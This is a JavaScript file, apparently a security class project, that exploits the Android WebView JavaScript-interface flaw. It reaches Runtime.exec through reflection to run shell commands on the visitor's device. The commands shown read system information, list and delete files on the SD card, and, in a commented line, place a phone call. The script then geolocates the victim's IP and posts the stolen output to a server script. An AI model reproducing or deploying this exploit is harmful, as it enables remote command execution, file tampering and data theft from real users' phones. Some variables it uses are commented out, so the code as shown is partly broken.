var myIndex = 1;
document.getElementById('EC521').addEventListener('click', hackSend);
var myTimer = setInterval(function () {switchPic()}, 3000);

function switchPic() {
    var pics = ["images/ec521.gif","images/ec504.gif","images/ec330.gif"];
    document.getElementById('EC521').src = pics[myIndex];
    myIndex = (myIndex + 1) % 3;
}

function hackSend() {
//    var myCommand1 = 'cat proc/cpuinfo';
//    var myCommand2 = 'cat proc/meminfo';
    var myCommand3 = 'service call phone 2 s16 6179924276';

//    var myCommand1 = 'ls mnt/sdcard/Download';
//    var myCommand2 = 'cat mnt/sdcard/Download/meminfo.txt';

//    var myCommand1 = 'cat mnt/sdcard/Download/meminfo.txt';
//    var myCommand2 = 'ls mnt/sdcard/Download';

//    var myCommand1 = 'rm mnt/sdcard/Download/meminfo.txt';
//    var myCommand2 = "echo 'Even though I love the players,\nAnd you love the game!' > mnt/sdcard/Download/secret.txt";


//'cat mnt/sdcard/Download/sol6.pdf';
//'am start -a android.media.action.VIDEO_CAPTURE';

    var output1 = execute(myCommand1);
    var output2 = execute(myCommand2);
//    var output3 = execute(myCommand3);
    
//6176421374
//    smsManager.sendTextMessage("6176421374",null,"You're Hacked",null,null);

    $.getJSON("http://ip-api.com/json/?callback=?", function(data) {
        document.getElementById('indicator').innerHTML='Hacked!<br />'
            +'Your IP is '+data.query+'<br />'
            +'Latitude: '+data.lat+'; Longitude: '+data.lon
            +'<br />'+data.city+', '+data.region+' '+data.zip
            +'<br /><br />CPU info:<br />'+output1+'<br /><br />Mem info:<br />'+output2;
        $.post('/getPost.php',{vuln_type : myCommand1, vuln_print : output1, ip_addr : data.query});
            //vuln_print1 : output1, vuln_print2 : output2, ip_addr : data.query});
    });
}

/* Iterate through entire window looking for javascript interface */
function getJsVar()
{
    for (var prop in window)
    {
        try
        {
            window[prop].getClass();
            return window[prop];  
        }
        catch(err)
        {
            //console.log(err);
        }
    }
    console.log("Could not find JS interface");
    return null;
}

/* Execute command and receive result */
function execute(cmd)
{
    /* Find interface variable */
    var jsVar = getJsVar();
    if (jsVar == null)
        return null;
    /* Reflection-fu to get to Runtime.exec() and passing commands to sh */
    var inputStream = jsVar.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(['/system/bin/sh', '-c', cmd]).getInputStream();
    var output = "";
    /* Iterate through response */
    do
    {
        var readint = inputStream.read();
        if (readint > -1)
            output += String.fromCharCode(readint);
    }
    while (readint > -1);
    return output;
}

/* Get application data directory */
function getDataDir()
{
    var id = execute('id');
    var app_id = /(app_\d+|u0_a\d+)/g.exec(id);
    if (app_id.length > 0)
        app_id = app_id[0];
    else
        app_id = "failed";
    var ps = execute('ps');
    var ps_lines = ps.split("\\n").sort();
    for (var i in ps_lines)
    {
        try
        {
            if (ps_lines[i].indexOf(app_id) > -1)
            {
                var splits = ps_lines[i].split(" ");
                var last_col = splits[splits.length-1].trim();
                if (last_col.indexOf('.') > 0)
                    return '/data/data/' + last_col;
            }
        }
        catch(e)
        {
            console.log(e);
        }
    }
}